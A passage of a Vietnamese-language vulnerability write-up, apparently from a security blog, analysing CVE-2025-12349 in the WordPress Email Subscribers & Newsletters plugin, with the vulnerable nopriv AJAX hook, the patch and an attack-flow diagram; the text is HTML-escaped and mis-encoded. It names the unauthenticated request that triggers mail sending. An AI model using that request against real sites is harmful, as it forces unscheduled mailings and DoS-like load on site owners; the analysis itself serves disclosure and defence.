&lt;strong&gt;&lt;code&gt;last-cron-hit&lt;/code&gt;&lt;/strong&gt;), t·ª´ ƒë√≥ &lt;strong&gt;t·∫°o ƒëi·ªÅu ki·ªán cho h√†nh vi l·∫°m d·ª•ng ho·∫∑c c√°c hi·ªáu ·ª©ng gi·ªëng DoS&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-12349&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-12349&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Broken Access Control&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 5.9.10&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 5.9.11&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/email-subscribers/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Email Subscribers &amp;amp; Newsletters Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Email Subscribers &amp;amp; Newsletters&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;5.9.10&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;5.9.11&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒëƒÉng k√Ω &lt;strong&gt;action hook&lt;/strong&gt; nh∆∞ sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action(&#xA;    &amp;#39;wp_ajax_nopriv_ig_es_trigger_mailing_queue_sending&amp;#39;,&#xA;    array( $this, &amp;#39;trigger_mailing_queue_sending&amp;#39; )&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hook &lt;strong&gt;&lt;code&gt;wp_ajax_nopriv_&lt;/code&gt;&lt;/strong&gt; l√† c∆° ch·∫ø cho ph√©p &lt;strong&gt;t·∫•t c·∫£ ng∆∞·ªùi d√πng&lt;/strong&gt;, bao g·ªìm c·∫£ &lt;strong&gt;ng∆∞·ªùi d√πng ch∆∞a ƒëƒÉng nh·∫≠p&lt;/strong&gt;, truy c·∫≠p v√†o &lt;strong&gt;AJAX endpoint&lt;/strong&gt; c·ªßa WordPress.&lt;/p&gt;&#xA;&lt;p&gt;V√¨ v·∫≠y, khi truy c·∫≠p endpoint &lt;strong&gt;&lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt;&lt;/strong&gt; v·ªõi tham s·ªë:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;action=ig_es_trigger_mailing_queue_sending&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;WordPress s·∫Ω &lt;strong&gt;g·ªçi tr·ª±c ti·∫øp callback&lt;/strong&gt; &lt;strong&gt;&lt;code&gt;trigger_mailing_queue_sending&lt;/code&gt;&lt;/strong&gt; m√† &lt;strong&gt;kh√¥ng c√≥ b·∫•t k·ª≥ ki·ªÉm tra x√°c th·ª±c hay ph√¢n quy·ªÅn n√†o&lt;/strong&gt;, d·∫´n ƒë·∫øn vi·ªác &lt;strong&gt;b·∫•t k·ª≥ ai&lt;/strong&gt; c≈©ng c√≥ th·ªÉ k√≠ch ho·∫°t &lt;strong&gt;logic g·ª≠i email qua cron&lt;/strong&gt;, &lt;strong&gt;b·ªè qua l·ªãch g·ª≠i&lt;/strong&gt;, v√† &lt;strong&gt;l√†m thay ƒë·ªïi tr·∫°ng th√°i n·ªôi b·ªô c·ªßa plugin&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function trigger_mailing_queue_sending() {&#xA;    // Call cron action only when it is not locked.&#xA;    if ( ! ES()-&amp;gt;cron-&amp;gt;is_locked() ) {&#xA;        // Start processing of campaigns which are scheduled for current date time.&#xA;        do_action( &amp;#39;ig_es_cron_worker&amp;#39; );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;strong&gt;&lt;code&gt;trigger_mailing_queue_sending()&lt;/code&gt;&lt;/strong&gt; c√≥ nhi·ªám v·ª• &lt;strong&gt;k√≠ch ho·∫°t ti·∫øn tr√¨nh cron g·ª≠i email&lt;/strong&gt; c·ªßa plugin.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;ƒê·∫ßu ti√™n, h√†m ki·ªÉm tra tr·∫°ng th√°i &lt;strong&gt;lock&lt;/strong&gt; c·ªßa cron th√¥ng qua &lt;strong&gt;&lt;code&gt;ES()-&amp;gt;cron-&amp;gt;is_locked()&lt;/code&gt;&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu cron &lt;strong&gt;ƒëang b·ªã kh√≥a&lt;/strong&gt;, h√†m s·∫Ω &lt;strong&gt;kh√¥ng th·ª±c hi·ªán g√¨&lt;/strong&gt;, nh·∫±m tr√°nh vi·ªác nhi·ªÅu ti·∫øn tr√¨nh g·ª≠i email ch·∫°y song song.&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu cron &lt;strong&gt;ch∆∞a b·ªã kh√≥a&lt;/strong&gt;, h√†m s·∫Ω g·ªçi &lt;strong&gt;&lt;code&gt;do_action( &#39;ig_es_cron_worker&#39; )&lt;/code&gt;&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;2 callback ƒë√£ ƒë∆∞·ª£c ƒëƒÉng k√Ω cho action hook &lt;code&gt;ig_es_cron_worker&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;ig_es_cron_worker&amp;#39;, array( &amp;amp;$this, &amp;#39;process_campaigns&amp;#39; ), 10 );&#xA;add_action( &amp;#39;ig_es_cron_worker&amp;#39;, array( &amp;amp;$this, &amp;#39;process_queue&amp;#39; ), 30 );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hook n√†y s·∫Ω g·ªçi callback theo th·ª© t·ª± ∆∞u ti√™n: &lt;code&gt;process_campaigns()&lt;/code&gt; ch·∫°y tr∆∞·ªõc v√† &lt;code&gt;process_queue()&lt;/code&gt; ch·∫°y sau&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function process_campaigns() {&#xA;&#xA;    if ( ES()-&amp;gt;cron-&amp;gt;should_unlock() ) {&#xA;        ES()-&amp;gt;cron-&amp;gt;unlock();&#xA;    }&#xA;&#xA;    ES()-&amp;gt;cron-&amp;gt;set_last_hit();&#xA;&#xA;    // ...&#xA;    $es_c_croncount = ES()-&amp;gt;mailer-&amp;gt;get_total_emails_send_now();&#xA;&#xA;    if ( $es_c_croncount &amp;gt; 0 ) {&#xA;&#xA;        // ...&#xA;        $notification = ES_DB_Mailing_Queue::get_notification_to_be_sent( $campaign_hash );&#xA;        $notification_guid = isset( $notification[&amp;#39;hash&amp;#39;] ) ? $notification[&amp;#39;hash&amp;#39;] : null;&#xA;        $campaign_id = isset( $notification[&amp;#39;campaign_id&amp;#39;] ) ? $notification[&amp;#39;campaign_id&amp;#39;] : 0;&#xA;&#xA;        // ...&#xA;&#xA;        if ( ! is_null( $notification_guid ) ) {&#xA;&#xA;            $cron_job = &amp;#39;ig_es_cron_worker&amp;#39;;&#xA;&#xA;            // ...&#xA;            if ( ! $this-&amp;gt;is_cron_job_locked( $cron_job ) ) {&#xA;&#xA;                $locking_status = $this-&amp;gt;lock_cron_job( $cron_job );&#xA;                if ( &amp;#39;locked&amp;#39; === $locking_status ) {&#xA;&#xA;                    // ...&#xA;                    ES_DB_Mailing_Queue::update_sent_status( $notification_guid, &amp;#39;Sending&amp;#39; );&#xA;&#xA;                    // ...&#xA;                    $emails_data = ES_DB_Sending_Queue::get_emails_to_be_sent_by_hash(&#xA;                        $notification_guid,&#xA;                        $es_c_croncount&#xA;                    );&#xA;&#xA;                    if ( count( $emails_data ) &amp;gt; 0 ) {&#xA;&#xA;                        // ...&#xA;                        ES()-&amp;gt;mailer-&amp;gt;send(&#xA;                            $notification[&amp;#39;subject&amp;#39;],&#xA;                            $notification[&amp;#39;body&amp;#39;],&#xA;                            array_column( $emails_data, &amp;#39;email&amp;#39; ),&#xA;                            array( &amp;#39;guid&amp;#39; =&amp;gt; $notification_guid )&#xA;                        );&#xA;&#xA;                        // ...&#xA;                        if ( ES_DB_Sending_Queue::get_total_emails_to_be_sent_by_hash( $notification_guid ) === 0 ) {&#xA;                            ES_DB_Mailing_Queue::update_sent_status( $notification_guid, &amp;#39;Sent&amp;#39; );&#xA;                        }&#xA;&#xA;                        // ...&#xA;                    }&#xA;&#xA;                    $this-&amp;gt;unlock_cron_job( $cron_job );&#xA;                }&#xA;            }&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;H√†m &lt;code&gt;process_campaigns()&lt;/code&gt;:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;M·ªü kh√≥a cron n·∫øu c·∫ßn v√† c·∫≠p nh·∫≠t th·ªùi ƒëi·ªÉm cron ch·∫°y.&lt;/li&gt;&#xA;&lt;li&gt;L·∫•y &lt;strong&gt;gi·ªõi h·∫°n s·ªë email&lt;/strong&gt; c√≥ th·ªÉ g·ª≠i trong m·ªôt l·∫ßn ch·∫°y.&lt;/li&gt;&#xA;&lt;li&gt;L·∫•y &lt;strong&gt;campaign ƒëang ch·ªù g·ª≠i&lt;/strong&gt; t·ª´ &lt;code&gt;ig_es_mailing_queue&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Ki·ªÉm tra v√† &lt;strong&gt;lock cron job&lt;/strong&gt; ƒë·ªÉ tr√°nh ch·∫°y song song.&lt;/li&gt;&#xA;&lt;li&gt;Chuy·ªÉn tr·∫°ng th√°i campaign sang &lt;strong&gt;&lt;code&gt;Sending&lt;/code&gt;&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;L·∫•y danh s√°ch email c·∫ßn g·ª≠i theo &lt;strong&gt;batch size&lt;/strong&gt; t·ª´ &lt;code&gt;ig_es_sending_queue&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Th·ª±c hi·ªán &lt;strong&gt;g·ª≠i email h√†ng lo·∫°t&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu ƒë√£ g·ª≠i h·∫øt email, c·∫≠p nh·∫≠t tr·∫°ng th√°i campaign sang &lt;strong&gt;&lt;code&gt;Sent&lt;/code&gt;&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Cu·ªëi c√πng &lt;strong&gt;unlock cron job&lt;/strong&gt; ƒë·ªÉ c√°c l·∫ßn ch·∫°y sau ti·∫øp t·ª•c x·ª≠ l√Ω.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function process_queue() {&#xA;&#xA;    global $wpdb;&#xA;&#xA;    if ( ES()-&amp;gt;cron-&amp;gt;should_unlock() ) {&#xA;        ES()-&amp;gt;cron-&amp;gt;unlock();&#xA;    }&#xA;&#xA;    ES()-&amp;gt;cron-&amp;gt;set_last_hit();&#xA;&#xA;    $email_sending_limit = ES()-&amp;gt;mailer-&amp;gt;get_total_emails_send_now();&#xA;&#xA;    if ( $email_sending_limit &amp;gt; 0 ) {&#xA;&#xA;        $micro_time = microtime( true );&#xA;&#xA;        ...&#xA;        $notifications = $wpdb-&amp;gt;get_results(&#xA;            ...&#xA;        );&#xA;&#xA;        $batch_start_time = time();&#xA;&#xA;        if ( is_array( $notifications ) &amp;amp;&amp;amp; count( $notifications ) &amp;gt; 0 ) {&#xA;&#xA;            ...&#xA;            $contacts = ES()-&amp;gt;contacts_db-&amp;gt;get_details_by_ids( $contact_ids );&#xA;&#xA;            foreach ( $campaigns_notifications as $campaign_id =&amp;gt; $notifications ) {&#xA;&#xA;                ...&#xA;&#xA;                foreach ( $notifications as $notification ) {&#xA;&#xA;                    ...&#xA;&#xA;                    if ( &amp;#39;optin_confirmation&amp;#39; === $notification_type ) {&#xA;                        ...&#xA;                    } elseif ( &amp;#39;optin_welcome_email&amp;#39; === $notification_type ) {&#xA;                        ...&#xA;                    } else {&#xA;                        ...&#xA;                    }&#xA;&#xA;                    $email_sending_limit--;&#xA;&#xA;                    if ( $email_sent ) {&#xA;                        $this-&amp;gt;db-&amp;gt;delete_from_queue( $campaign_id, $contact_id );&#xA;                    }&#xA;&#xA;                    if (&#xA;                        $email_sending_limit &amp;lt;= 0 ||&#xA;                        IG_ES_Background_Process_Helper::time_exceeded( $batch_start_time, 0.8 ) ||&#xA;                        IG_ES_Background_Process_Helper::memory_exceeded()&#xA;                    ) {&#xA;                        break 2;&#xA;                    }&#xA;                }&#xA;            }&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;H√†m &lt;code&gt;process_queue()&lt;/code&gt;:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Ki·ªÉm tra v√† m·ªü kh√≥a cron n·∫øu c·∫ßn, sau ƒë√≥ c·∫≠p nh·∫≠t th·ªùi ƒëi·ªÉm cron ch·∫°y l·∫ßn cu·ªëi.&lt;/li&gt;&#xA;&lt;li&gt;X√°c ƒë·ªãnh s·ªë l∆∞·ª£ng email t·ªëi ƒëa c√≥ th·ªÉ g·ª≠i trong m·ªôt l·∫ßn th·ª±c thi.&lt;/li&gt;&#xA;&lt;li&gt;Truy v·∫•n b·∫£ng &lt;code&gt;ig_queue&lt;/code&gt; ƒë·ªÉ l·∫•y c√°c email ƒë√£ ƒë·∫øn th·ªùi ƒëi·ªÉm g·ª≠i nh∆∞ng ch∆∞a ƒë∆∞·ª£c g·ª≠i.&lt;/li&gt;&#xA;&lt;li&gt;Gom c√°c b·∫£n ghi theo &lt;code&gt;campaign_id&lt;/code&gt; v√† l·∫•y th√¥ng tin contact t∆∞∆°ng ·ª©ng.&lt;/li&gt;&#xA;&lt;li&gt;V·ªõi t·ª´ng contact trong queue, x√°c ƒë·ªãnh lo·∫°i email v√† th·ª±c hi·ªán g·ª≠i ph√π h·ª£p.&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu g·ª≠i th√†nh c√¥ng, x√≥a b·∫£n ghi t∆∞∆°ng ·ª©ng kh·ªèi queue.&lt;/li&gt;&#xA;&lt;li&gt;D·ª´ng x·ª≠ l√Ω khi ƒë·∫°t gi·ªõi h·∫°n g·ª≠i, g·∫ßn h·∫øt th·ªùi gian th·ª±c thi ho·∫∑c v∆∞·ª£t gi·ªõi h·∫°n b·ªô nh·ªõ.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;L·ªói&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;&lt;strong&gt;L·ªó h·ªïng ph√°t sinh do kh√¥ng th·ª±c hi·ªán b·∫•t k·ª≥ ki·ªÉm tra quy·ªÅn (capability/permission) n√†o.&lt;/strong&gt;&#xA;H√†m x·ª≠ l√Ω ƒë∆∞·ª£c g·∫Øn v·ªõi hook &lt;strong&gt;&lt;code&gt;wp_ajax_nopriv_&lt;/code&gt;&lt;/strong&gt;, cho ph√©p &lt;strong&gt;ng∆∞·ªùi d√πng ch∆∞a ƒëƒÉng nh·∫≠p&lt;/strong&gt; g·ªçi tr·ª±c ti·∫øp endpoint AJAX. Khi callback ƒë∆∞·ª£c th·ª±c thi, code &lt;strong&gt;kh√¥ng ki·ªÉm tra quy·ªÅn ng∆∞·ªùi d√πng&lt;/strong&gt;, &lt;strong&gt;kh√¥ng x√°c th·ª±c nonce&lt;/strong&gt;, d·∫´n ƒë·∫øn vi·ªác &lt;strong&gt;b·∫•t k·ª≥ ai&lt;/strong&gt; c≈©ng c√≥ th·ªÉ k√≠ch ho·∫°t logic n·ªôi b·ªô (cron g·ª≠i email), &lt;strong&gt;b·ªè qua l·ªãch g·ª≠i&lt;/strong&gt;, v√† &lt;strong&gt;thay ƒë·ªïi tr·∫°ng th√°i h·ªá th·ªëng&lt;/strong&gt;.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;B·∫£n v√° (v5.9.11)&lt;/strong&gt; kh·∫Øc ph·ª•c l·ªó h·ªïng b·∫±ng c√°ch &lt;strong&gt;b·ªï sung ki·ªÉm so√°t truy c·∫≠p v√† x√°c th·ª±c y√™u c·∫ßu&lt;/strong&gt; tr∆∞·ªõc khi cho ph√©p k√≠ch ho·∫°t cron g·ª≠i email.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function trigger_mailing_queue_sending() {&#xA;    $can_access_campaign = ES_Common::ig_es_can_access( &amp;#39;campaigns&amp;#39; );&#xA;    $nonce = ig_es_get_request_data( &amp;#39;nonce&amp;#39; );&#xA;    &#xA;    if ( ! $can_access_campaign ) {&#x9;&#xA;        return;&#xA;    } &#xA;&#xA;    if ( empty( $nonce ) || ! wp_verify_nonce( $nonce, &amp;#39;ig-es-trigger-mailing-queue-sending-nonce&amp;#39; ) ) {&#xA;        return;&#xA;    }&#xA;        &#xA;    // Call cron action only when it is not locked.&#xA;    if ( ! ES()-&amp;gt;cron-&amp;gt;is_locked() ) {&#x9;&#x9;&#xA;        // Start processing of campaigns which are scheduled for current date time.&#xA;        do_action( &amp;#39;ig_es_cron_worker&amp;#39; );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Ki·ªÉm tra quy·ªÅn (capability check)&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$can_access_campaign = ES_Common::ig_es_can_access( &amp;#39;campaigns&amp;#39; );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ch·ªâ ng∆∞·ªùi d√πng c√≥ quy·ªÅn truy c·∫≠p &lt;strong&gt;campaigns&lt;/strong&gt; m·ªõi ƒë∆∞·ª£c ph√©p ti·∫øp t·ª•c. N·∫øu kh√¥ng c√≥ quy·ªÅn ‚Üí &lt;strong&gt;return&lt;/strong&gt; ngay.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function ig_es_can_access( $page ) {&#xA;    $user = wp_get_current_user();&#xA;&#xA;    if ( ! $user-&amp;gt;exists() ) {&#xA;        return false;&#xA;    }&#xA;&#xA;    $default_permission = &amp;#39;manage_options&amp;#39;;&#xA;&#xA;    $can_access = $user-&amp;gt;has_cap( $default_permission );&#xA;&#xA;    // Is Admin? Have full access.&#xA;    if ( $can_access ) {&#xA;        return true;&#xA;    }&#xA;&#xA;    // We are using this filter in ES Premium to check permission.&#xA;    return apply_filters( &amp;#39;ig_es_can_access&amp;#39;, $can_access, $page );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;strong&gt;&lt;code&gt;ig_es_can_access()&lt;/code&gt;&lt;/strong&gt; d√πng ƒë·ªÉ ki·ªÉm tra quy·ªÅn truy c·∫≠p c·ªßa ng∆∞·ªùi d√πng hi·ªán t·∫°i. N·∫øu ng∆∞·ªùi d√πng &lt;strong&gt;ch∆∞a ƒëƒÉng nh·∫≠p&lt;/strong&gt; th√¨ b·ªã t·ª´ ch·ªëi ngay. M·∫∑c ƒë·ªãnh, ch·ªâ nh·ªØng user c√≥ quy·ªÅn &lt;strong&gt;&lt;code&gt;manage_options&lt;/code&gt;&lt;/strong&gt; (Administrator) m·ªõi ƒë∆∞·ª£c ph√©p truy c·∫≠p. Tr∆∞·ªùng h·ª£p kh√¥ng c√≥ quy·ªÅn n√†y, k·∫øt qu·∫£ s·∫Ω ph·ª• thu·ªôc v√†o &lt;strong&gt;filter &lt;code&gt;ig_es_can_access&lt;/code&gt;&lt;/strong&gt; ƒë·ªÉ cho ph√©p m·ªü r·ªông ho·∫∑c t√πy ch·ªânh quy·ªÅn.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;X√°c th·ª±c nonce (CSRF protection)&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$nonce = ig_es_get_request_data( &amp;#39;nonce&amp;#39; );&#xA;wp_verify_nonce( $nonce, &amp;#39;ig-es-trigger-mailing-queue-sending-nonce&amp;#39; );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒê·∫£m b·∫£o request l√† h·ª£p l·ªá v√† ƒë∆∞·ª£c t·∫°o t·ª´ giao di·ªán h·ª£p ph√°p c·ªßa WordPress, ngƒÉn vi·ªác g·ªçi tr·ª±c ti·∫øp t·ª´ b√™n ngo√†i.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Gi·ªØ nguy√™n logic c≈© nh∆∞ng ƒë·∫∑t sau ki·ªÉm tra b·∫£o m·∫≠t&lt;/strong&gt;&#xA;Ch·ªâ sau khi &lt;strong&gt;ƒë√£ qua ki·ªÉm tra quy·ªÅn v√† nonce&lt;/strong&gt;, h√†m m·ªõi ki·ªÉm tra &lt;strong&gt;cron lock&lt;/strong&gt; v√† g·ªçi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;do_action( &amp;#39;ig_es_cron_worker&amp;#39; );&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;üëâ K·∫øt qu·∫£: endpoint AJAX &lt;strong&gt;kh√¥ng c√≤n b·ªã l·∫°m d·ª•ng b·ªüi ng∆∞·ªùi d√πng ch∆∞a ƒëƒÉng nh·∫≠p&lt;/strong&gt;, ngƒÉn vi·ªác &lt;strong&gt;√©p g·ª≠i email&lt;/strong&gt;, &lt;strong&gt;b·ªè qua l·ªãch&lt;/strong&gt;, v√† &lt;strong&gt;DoS-like behavior&lt;/strong&gt; nh∆∞ tr∆∞·ªõc.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;Unauthenticated attacker&amp;#34;] --&amp;gt; B[&amp;#34;Send request to /wp-admin/admin-ajax.php?action=ig_es_trigger_mailing_queue_sending&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;wp_ajax_nopriv_ig_es_trigger_mailing_queue_sending hook&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;trigger_mailing_queue_sending() is executed&amp;#34;]&#xA;D --&amp;gt; E{&amp;#34;Capability check?&amp;#34;}&#xA;E -- No --&amp;gt; F[&amp;#34;No permission validation&amp;#34;]&#xA;F --&amp;gt; G{&amp;#34;Nonce verification?&amp;#34;}&#xA;G -- No --&amp;gt; H[&amp;#34;No CSRF protection&amp;#34;]&#xA;H --&amp;gt; I{&amp;#34;Cron locked?&amp;#34;}&#xA;I -- No --&amp;gt; J[&amp;#34;do_action(&amp;#39;ig_es_cron_worker&amp;#39;)&amp;#34;]&#xA;J --&amp;gt; K[&amp;#34;process_campaigns()&amp;#34;]&#xA;J --&amp;gt; L[&amp;#34;process_queue()&amp;#34;]&#xA;K --&amp;gt; M[&amp;#34;Force email campaigns to 